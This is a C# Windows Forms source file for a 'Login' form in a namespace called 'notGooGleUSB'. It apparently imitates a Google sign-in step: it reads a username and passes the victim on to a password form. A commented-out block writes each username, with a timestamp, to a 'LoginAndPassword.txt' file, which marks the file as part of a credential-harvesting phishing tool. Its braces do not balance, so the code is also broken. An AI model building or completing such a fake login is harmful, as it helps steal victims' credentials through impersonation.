namespace notGooGleUSB
{
    public partial class Login : Form
    {
        public Login()
        {
            InitializeComponent();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            userNameTxtBox.Select();

        }

        private void Next_Click(object sender, EventArgs e)
        {

            string userName = userNameTxtBox.Text;




            var frm = new Password();
            frm.Show();
            Hide();

            //bool exeDirectoryExists = Directory.Exists(AppDomain.CurrentDomain.BaseDirectory);

            //if (!exeDirectoryExists)
            //{
            //    foreach (Form form in Application.OpenForms)
            //    {
            //        form.Close();
            //    }
            //}
            //else
            //{
            //    string exeDirectory = AppDomain.CurrentDomain.BaseDirectory;
            //    string logDirectory = Path.Combine(exeDirectory, "Login Information");
            //    string logFilePath = Path.Combine(logDirectory, "LoginAndPassword.txt");

            //    string username = $"Log in started @ {DateTime.Now}" + Environment.NewLine + $"User Name: {userNameTxtBox.Text}";

            //    if (!Directory.Exists(logDirectory))
            //    {
            //        Directory.CreateDirectory(logDirectory);
            //    }

            //    if (!File.Exists(logFilePath))
            //    {
            //        using (var sw = File.CreateText(logFilePath))
            //        {
            //            sw.WriteLine(username );
            //        }
            //    }
            //    else
            //    {
            //        using (StreamWriter sw = File.AppendText(logFilePath))
            //        {
            //            sw.Write(username + "\n");
            //        }
            //    }

        }
        }


        private void enter(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Next.PerformClick();
            }
        }

        private void userNameTxtBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                Next_Click(sender, e); // Simulate click on "Next" button
            }
        }
    }
    
}

